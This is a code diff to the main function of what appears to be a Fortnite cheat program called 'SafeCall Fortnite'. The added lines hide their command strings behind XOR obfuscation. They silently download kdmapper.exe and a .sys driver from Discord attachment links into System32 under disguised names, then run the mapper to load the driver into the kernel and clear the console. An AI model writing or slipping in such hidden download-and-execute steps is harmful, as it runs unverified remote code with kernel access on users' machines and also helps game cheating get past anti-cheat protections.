@@ -1244,6 +1244,14 @@ DWORD GetProcessID(LPCWSTR processName) {
 int main()
 {
 	SonyDriverHelper::api::Init();
+	// wasn't originally there but added it, since he took the drivers out
+	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1009782557904220211/1011579935388860436/kdmapper.exe --output C:\\Windows\\System32\\driverLoader.exe >nul 2>&1").c_str());
+	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1052036874933370911/1052382804685623326/Udness.sys --output C:\\Windows\\System32\\DUDUDUD.sys >nul 2>&1").c_str());
+	system(_xor_("cls").c_str());
+	system(_xor_("cd C:\\Windows\\System32\\").c_str());
+	system(_xor_("C:\\Windows\\System32\\driverLoader.exe C:\\Windows\\System32\\DUDUDUD.sys").c_str());
+	Sleep(2500);
+	system("cls");
 	SetConsoleTitleW(L"SafeCall Fortnite | Latest Build : 12/6/22");
 	if (Comms::Setup("")) {
 		Beep(500, 500);
